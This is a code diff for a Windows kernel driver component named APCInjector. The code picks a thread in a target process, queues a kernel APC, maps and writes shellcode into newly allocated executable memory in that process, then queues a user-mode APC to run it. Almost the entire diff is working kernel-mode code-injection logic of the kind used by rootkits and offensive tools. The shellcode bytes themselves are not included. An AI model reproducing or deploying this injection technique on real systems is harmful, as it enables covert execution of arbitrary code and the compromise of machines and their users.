@@ -9,14 +9,16 @@ APCInjector::APCInjector(Process& process, NonPagedBuffer& shellcode)
 
 NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
     auto status = STATUS_SUCCESS;
-    const auto processInformation = std::make_unique<SYSTEM_PROCESS_INFO, PagedPool, POOL_TAG>();
     const auto isWow64 = PsGetProcessWow64Process(m_process.get()) != NULL;
+    ULONG bytesToAllocate = 0;
 
-    ULONG bytesToAllocate;
     status = ZwQuerySystemInformation(SystemProcessInformation, nullptr, NULL, &bytesToAllocate);
-    if (!NT_SUCCESS(status)) {
+    if (status != STATUS_INFO_LENGTH_MISMATCH) {
         return status;
     }
+
+    const auto processInformation = UniquePtr<SYSTEM_PROCESS_INFO, PagedPool, POOL_TAG>(
+        reinterpret_cast<PSYSTEM_PROCESS_INFO>(ExAllocatePoolWithTag(PagedPool, bytesToAllocate, POOL_TAG)));
 
     status = ZwQuerySystemInformation(SystemProcessInformation, processInformation.get(), bytesToAllocate, NULL);
     if (!NT_SUCCESS(status)) {
@@ -26,8 +28,7 @@ NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
     status = STATUS_NOT_FOUND;
     for (auto entry = processInformation.get(); entry->NextEntryOffset != NULL; entry = reinterpret_cast<PSYSTEM_PROCESS_INFO>((reinterpret_cast<PUCHAR>(entry) + entry->NextEntryOffset))) {
         if (entry->UniqueProcessId == m_process.getPid()){
-            for (size_t i = 0; i < entry->NumberOfThreads; i++)
-            {
+            for (size_t i = 0; i < entry->NumberOfThreads; i++){
                 if (entry->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId()) {
                     continue;
                 }
@@ -44,51 +45,90 @@ NTSTATUS APCInjector::findInjectableThread(PULONG tid) {
             }
         }
     }
-
     return status;
 }
 
-NTSTATUS APCInjector::inject() {
+NTSTATUS APCInjector::queueKernelApc() {
     ULONG threadId = 0;
-    const auto status = findInjectableThread(&threadId);
+    auto status = findInjectableThread(&threadId);
 
     if (!NT_SUCCESS(status)) {
         return status;
     }
 
-    auto thread = Thread(threadId);
-
-    auto apc = std::make_unique<KAPC, NonPagedPool, POOL_TAG>();
-    if (!apc.get()) {
-        return STATUS_INSUFFICIENT_RESOURCES;
+    const auto injectableThread = Thread(threadId);
+    auto kernelApc = Apc(&normalRoutine, injectableThread, OriginalApcEnvironment, KernelMode);
+    if (kernelApc.queue()) {
+        return STATUS_SUCCESS;
     }
 
-    ApcHandler::KeInitializeApc(
-        apc.get(),
-        thread.get(),
-        ApcHandler::OriginalApcEnvironment,
-        &ApcHandler::kernelFreeKapc,
-        &ApcHandler::rundownFreeKapc,
-        &ApcHandler::normalInjectCode,
-        KernelMode,
-        nullptr
-    );
+    return STATUS_INTERNAL_ERROR;
+}
 
-    if (::ExAcquireRundownProtection(&ApcHandler::g_rundown_protection)) {
-        auto inserted = ApcHandler::KeInsertQueueApc(
-            apc.get(),
-            nullptr,
-            nullptr,
-            0
-        );
+void APCInjector::normalRoutine(PVOID, PVOID, PVOID) {
+	void* shellcodeAddress = nullptr;
+	size_t shellcodeSize = sizeof(shellcodeHandler::injectedShellcode);
 
-        if (!inserted) {
-            ::ExReleaseRundownProtection(&ApcHandler::g_rundown_protection);
+	auto status = ZwAllocateVirtualMemory(
+		NtCurrentProcess(),
+		&shellcodeAddress,
+		NULL,
+		&shellcodeSize,
+		MEM_RESERVE | MEM_COMMIT,
+		PAGE_EXECUTE_READ
+	);
 
-            KdPrint(("[-] Could not insert a kernel APC.\n"));
-            return STATUS_INTERNAL_ERROR;
-        }
-    }
+	auto mdl = IoAllocateMdl(shellcodeAddress, sizeof(shellcodeHandler::injectedShellcode), false, false, nullptr);
 
-	return status;
+	if (!mdl) {
+		KdPrint(("[-] Could not allocate a MDL.\n"));
+		return;
+	}
+
+	MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
+
+	auto mappedAddress = MmMapLockedPagesSpecifyCache(
+		mdl,
+		KernelMode,
+		MmNonCached,
+		nullptr,
+		false,
+		NormalPagePriority
+	);
+
+	if (!mappedAddress) {
+		MmUnlockPages(mdl);
+		IoFreeMdl(mdl);
+		KdPrint(("[-] Could not get a system address for the MDL.\n"));
+		return;
+	}
+
+	status = MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
+
+	if (!NT_SUCCESS(status)) {
+		MmUnmapLockedPages(mappedAddress, mdl);
+		MmUnlockPages(mdl);
+		IoFreeMdl(mdl);
+		KdPrint(("[-] Could not protect MDL address.\n"));
+		return;
+	}
+
+	RtlCopyMemory(mappedAddress, shellcodeHandler::injectedShellcode, shellcodeSize);
+
+	MmUnmapLockedPages(mappedAddress, mdl);
+	MmUnlockPages(mdl);
+	IoFreeMdl(mdl);
+
+	const auto currentThread = Thread(HandleToUlong(PsGetCurrentThreadId()));
+	__debugbreak();
+	auto apc = Apc(reinterpret_cast<PKNORMAL_ROUTINE>(shellcodeAddress), currentThread, OriginalApcEnvironment, UserMode);
+	apc.queue();
+
+	KeTestAlertThread(UserMode);
+
+	KdPrint(("[+] Injected code and queued an APC successfully (pid=%d).\n", PsGetCurrentProcessId()));
+}
+
+NTSTATUS APCInjector::inject() {
+    return queueKernelApc();
 }
